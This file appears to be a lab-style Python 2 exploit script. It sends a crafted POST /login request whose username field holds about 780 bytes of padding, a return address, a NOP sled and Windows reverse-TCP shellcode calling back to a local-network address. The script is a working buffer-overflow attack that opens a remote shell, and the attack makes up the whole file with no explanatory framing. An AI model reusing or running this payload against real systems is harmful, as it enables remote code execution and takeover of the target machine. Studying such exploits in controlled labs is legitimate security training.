#!/usr/bin/python

import socket

#badchars = \x00\x0a\x0d\x25\x26\x2b\x3d

#bad = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20")
#windows/shell_reverse_tcp lhost=192.168.0.16 lhost=443

shellcode = ("\xb8\x0f\xd1\x5a\x44\xda\xd0\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xea\xfc\x31\x42\x0e\x03\x4d\xdf\xb8\xb1\xad\x37\xbe"
"\x3a\x4d\xc8\xdf\xb3\xa8\xf9\xdf\xa0\xb9\xaa\xef\xa3\xef\x46"
"\x9b\xe6\x1b\xdc\xe9\x2e\x2c\x55\x47\x09\x03\x66\xf4\x69\x02"
"\xe4\x07\xbe\xe4\xd5\xc7\xb3\xe5\x12\x35\x39\xb7\xcb\x31\xec"
"\x27\x7f\x0f\x2d\xcc\x33\x81\x35\x31\x83\xa0\x14\xe4\x9f\xfa"
"\xb6\x07\x73\x77\xff\x1f\x90\xb2\x49\x94\x62\x48\x48\x7c\xbb"
"\xb1\xe7\x41\x73\x40\xf9\x86\xb4\xbb\x8c\xfe\xc6\x46\x97\xc5"
"\xb5\x9c\x12\xdd\x1e\x56\x84\x39\x9e\xbb\x53\xca\xac\x70\x17"
"\x94\xb0\x87\xf4\xaf\xcd\x0c\xfb\x7f\x44\x56\xd8\x5b\x0c\x0c"
"\x41\xfa\xe8\xe3\x7e\x1c\x53\x5b\xdb\x57\x7e\x88\x56\x3a\x17"
"\x7d\x5b\xc4\xe7\xe9\xec\xb7\xd5\xb6\x46\x5f\x56\x3e\x41\x98"
"\x99\x15\x35\x36\x64\x96\x46\x1f\xa3\xc2\x16\x37\x02\x6b\xfd"
"\xc7\xab\xbe\x52\x97\x03\x11\x13\x47\xe4\xc1\xfb\x8d\xeb\x3e"
"\x1b\xae\x21\x57\xb6\x55\xa2\x98\xef\x55\x22\x71\xf2\x55\x43"
"\x3a\x7b\xb3\x29\x2c\x2a\x6c\xc6\xd5\x77\xe6\x77\x19\xa2\x83"
"\xb8\x91\x41\x74\x76\x52\x2f\x66\xef\x92\x7a\xd4\xa6\xad\x50"
"\x70\x24\x3f\x3f\x80\x23\x5c\xe8\xd7\x64\x92\xe1\xbd\x98\x8d"
"\x5b\xa3\x60\x4b\xa3\x67\xbf\xa8\x2a\x66\x32\x94\x08\x78\x8a"
"\x15\x15\x2c\x42\x40\xc3\x9a\x24\x3a\xa5\x74\xff\x91\x6f\x10"
"\x86\xd9\xaf\x66\x87\x37\x46\x86\x36\xee\x1f\xb9\xf7\x66\xa8"
"\xc2\xe5\x16\x57\x19\xae\x37\xba\x8b\xdb\xdf\x63\x5e\x66\x82"
"\x93\xb5\xa5\xbb\x17\x3f\x56\x38\x07\x4a\x53\x04\x8f\xa7\x29"
"\x15\x7a\xc7\x9e\x16\xaf")


dados = "A" * 780 + "\x83\x0c\x09\x10" + "\x90" * 16 + shellcode
#dados = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af>
tam = len(dados) + 20

request="POST /login HTTP/1.1\r\n"
request+="Host: 192.168.0.5\r\n"
request+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n"
request+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
request+="Accept-Language: en-US,en;q=0.5\r\n"
request+="Accept-Encoding: gzip, deflate\r\n"
request+="Referer: http://192.168.0.5/login\r\n"
request+="Content-Type: application/x-www-form-urlencoded\r\n"
request+="Content-Length: "+str(tam)+"\r\n"
request+="DNT: 1\r\n"
request+="Connection: close\r\n"
request+="Upgrade-Insecure-Requests: 1\r\n"
request+="\r\n"
request+="username="+dados+"&password=A"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.5",80))
s.send(request)
